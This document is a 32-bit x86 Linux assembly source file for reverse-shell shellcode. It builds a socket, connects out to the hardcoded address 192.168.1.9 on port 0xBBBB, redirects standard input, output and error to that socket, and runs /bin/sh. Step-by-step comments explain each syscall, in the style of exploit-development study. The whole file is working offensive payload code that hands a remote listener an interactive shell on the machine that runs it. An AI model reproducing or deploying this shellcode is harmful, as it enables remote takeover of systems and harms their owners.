BITS 32
section .text
global _start

_start:
    xor eax, eax                ; clear eax
    xor ebx, ebx                ; clear ebx
    xor edx, edx                ; clear edx

; socket(2, 1, 0)
    push eax                    ; third arg to socket: 0
    push byte 0x1               ; second arg to socket: 1
    push byte 0x2               ; first arg to socket: 2
    mov ecx, esp                ; move the ptr to the args to ecx (second arg to socketcall)
    inc bl                      ; set first arg to socketcall to # 1
    mov al, 102                 ; call socketcall # 1: SYS_SOCKET
    int 0x80                    ; jump into kernel mode, execute the syscall
    mov esi, eax                ; store the return value (eax) into esi

; the next block replaces the bind listen and accept calls with connect
; client=connect(server, (struct sockaddr *) &serv_addr, 0x10)
    ;push edx                    ; still zero, used to terminate the next value pushed
    ;push byte 1
    ;push byte 0
    ;push byte 0
    ;push byte 127               ; load in 127.0.0.1 as IP address of target machine

    mov byte [esp],     192        ; You can set these to be the IP address of the victim machine
    mov byte [esp+1],   168        ; I set these to be 192.168.1.9.  They need to be pushed into stack in
    mov byte [esp+2],   1          ; this order.
    mov byte [esp+3],   9

    push word 0xBBBB            ; port number to listen to
    xor ecx, ecx                ; clear ecx to hold the sa_family field of struct
    mov cl, 2                   ; move single byte:2 to the low order byte of ecx
    push word cx                ; build struct, use port, sin.family:0002 four bytes
    mov ecx, esp                ; mov addr struct (on stack) to ecx
    push byte 0x10              ; begin the connect args, push 16 onto stack (16 bytes long)
    push ecx                    ; save address of struct back onto stack
    push esi                    ; save server file desciptor (esi) to stack
    mov ecx, esp                ; store pointer to args to ecx (2nd arg of socketcall)
    mov bl, 3                   ; set bl to #3, first arg of socketcall
    mov al, 102                 ; call socketcall #3: SYS_CONNECT
    int 0x80                    ; jump into kernel mode, execute the syscall

; prepare for dup2 commands, need client file handle saved in ebx
    mov ebx, esi

; dup2(soc, 0)
    xor ecx, ecx                ; clear ecx
    mov al, 63                  ; set first arg of syscall to 63: dup2
    int 0x80                    ; jump into kernel mode, execute the syscall

; dup2(soc, 1)
    inc ecx                     ; increment ecx to 1
    mov al, 63                  ; prepare for syscall to dup2: 63
    int 0x80                    ; jump into kernel mode, execute the syscall

; dup2(soc, 2)
    inc ecx                     ; increment ecx to 2
    mov al, 63                  ; prepare for syscall to dup2: 63
    int 0x80                    ; jump into kernel mode, execute the syscall

; standard execve("/bin/sh"....
; spawn shellcode with execve
    xor eax, eax		; clears the eax register, sets to 0
    push eax			; push a null value on the stack, value of eax
    push 0x68732f2f		; push '//sh' onto the stack, padded with leading '/'.  The leading '/' is required for 4 byte alignment and has no effect.
    push 0x6e69622f		; push /bin onto the stack, notice strings in reverse
    mov ebx, esp		; since esp now points to "/bin/sh", write to ebx
    push eax			; eax is still NULL, let's terminate char ** argv on stack
    push ebx			; still need a pointer to the address of '/bin/sh', use ebx
    mov ecx, esp		; now esp holds the address of argv, move it to ecx
    xor edx, edx		; set edx to zero (NULL), not needed
    mov al, 0xb			; set the syscall # to the decimal 11 or hex b, one byte
    int 0x80			; call the kernel to execute the syscall

